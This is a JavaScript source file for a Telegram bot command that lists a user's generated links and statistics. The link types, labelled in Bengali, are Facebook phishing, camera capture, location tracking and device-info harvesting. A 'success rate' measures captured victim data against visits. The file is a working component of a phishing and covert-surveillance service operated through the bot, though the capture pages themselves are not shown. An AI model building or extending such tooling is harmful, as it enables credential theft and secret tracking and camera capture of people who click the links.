const authMiddleware = require('../middlewares/auth');
const Link = require('../models/Link');
const Data = require('../models/Data');
const helpers = require('../utils/helpers');

module.exports = async (bot, msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.first_name;
  
  try {
    const auth = await authMiddleware(msg);
    if (!auth.allowed) return;
    
    // ইউজারের সব লিংক
    const links = await Link.find({ userId }).sort({ createdAt: -1 }).limit(5);
    
    // টোটাল কাউন্ট
    const totalLinks = await Link.countDocuments({ userId });
    const totalVisits = await Link.aggregate([
      { $match: { userId } },
      { $group: { _id: null, total: { $sum: '$visits' } } }
    ]);
    const totalData = await Data.countDocuments({ 
      linkId: { $in: links.map(l => l.linkId) } 
    });
    
    // সাকসেস রেট ক্যালকুলেট
    const successRate = totalVisits[0]?.total > 0 
      ? ((totalData / totalVisits[0]?.total) * 100).toFixed(1) 
      : 0;
    
    let linksList = '';
    links.forEach((link, index) => {
      let typeName = '';
      switch(link.type) {
        case 'fb': typeName = 'ফেসবুক ফিশিং'; break;
        case 'camera': typeName = 'ক্যামেরা টুল'; break;
        case 'location': typeName = 'লোকেশন ট্র্যাকার'; break;
        case 'info': typeName = 'ডিভাইস ইনফো'; break;
        case 'all': typeName = 'অল-ইন-ওয়ান'; break;
        case 'custom': typeName = 'কাস্টম রিডাইরেক্ট'; break;
      }
      
      linksList += `\n${index+1}. ${typeName}\n` +
        `🔗 আইডি: ${link.linkId}\n` +
        `👁️ ভিজিট: ${link.visits} | 📦 ডাটা: ${link.data}\n` +
        `📅 ক্রিয়েটেড: ${helpers.formatTime(link.createdAt, 'hh:mm A')}\n` +
        `⚡ স্ট্যাটাস: ${link.active ? '✅ একটিভ' : '⏸️ নিষ্ক্রিয়'}\n`;
    });
    
    const message = `📊 𝐘𝐎𝐔𝐑 𝐋𝐈𝐍𝐊 𝐃𝐀𝐒𝐇𝐁𝐎𝐀𝐑𝐃\n\n` +
      `👤 ইউজার: ${userName}\n` +
      `🆔 আইডি: ${userId}\n` +
      `📊 স্ট্যাটিস্টিক্স:\n` +
      `• টোটাল লিঙ্ক: ${totalLinks}\n` +
      `• টোটাল ভিজিট: ${totalVisits[0]?.total || 0}\n` +
      `• টোটাল ডাটা: ${totalData}\n` +
      `• সাকসেস রেট: ${successRate}%\n\n` +
      `🔗 ইওর লিঙ্কস (রিসেন্ট ৫):\n${linksList || '\nকোনো লিংক নেই'}\n\n` +
      `🔄 আরও দেখতে: /mylinks all\n` +
      `📥 এক্সপোর্ট: /export mydata`;
    
    await bot.sendMessage(chatId, message);
    
  } catch (error) {
    console.error('MyLinks Command Error:', error);
    await bot.sendMessage(chatId, '❌ এরর হয়েছে।');
  }
};